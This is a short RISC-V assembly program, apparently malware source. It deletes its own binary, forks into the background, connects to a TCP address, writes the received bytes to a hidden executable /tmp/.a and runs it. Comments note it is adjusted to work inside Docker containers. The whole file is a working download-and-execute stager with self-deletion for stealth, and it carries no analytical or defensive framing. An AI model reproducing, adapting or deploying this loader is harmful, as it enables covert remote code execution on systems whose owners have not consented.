	.text
	.global _start
_start:
	# Unlink file
        li a7, 35      # unlinkat
        li a0, -100    # AT_FDCWD
        ld a1, 8(sp)   # argv[0]
        move a2, zero
        ecall

        li a7, 220   # clone
        li a0, 17
        move a1, zero
        #move a2, zero
        move a3, zero
        ecall
        bne a0, zero, exit
        move t1, a0
	

	# Create socket
	li  a7, 198
	li  a0, 2
	li  a1, 1
	li  a2, 6
	ecall
	move t0, a0
	
	# connect (a0 already set to socket)
	li a7, 203
	la a1, addr
	li a2, 16
	ecall
	
	# memfd_create
	#li a7, 279
	#la a0, fname
	#li a1, 1
	#ecall
	
	# openat
	li a7, 56
	li a0, 0
	la a1, fname1
	li a2, 101
	li a3, 511
	ecall
	
	move t1, a0
	
	# Copy loop
	# Allocate memory
	add sp, sp, -1024
	move a1, sp
	li   t3, 1024
b0:
	li   a7, 63   # sys_READ
	move a0, t0
	#li   a2, 1024
	move a2, t3
	ecall

	blez a0, done  # read <= 0 
	li   a7, 64    # Sys_WRITE
	move a2, a0

	move a0, t1
	ecall
	j b0
done:	
	# Close files
	li   a7, 57
	move a0, t0
	ecall
	move a0, t1
	ecall
	

	li a7, 221
	la a0, fname1
	li a1, 0
	li a2, 0
	ecall

exit:
        # Exit
        li a7, 93
        li a0, 0
        ecall
	

fname1:
#.asciz "/dev/shm/.a"  # Docker may set /dev/shm as noexec. 
	.asciz "/tmp/.a"  # Try this is /dev/sdhm is mounted noexec
nullstr:
	.quad 0
addr:
	.quad 0x0100007f11110002
	
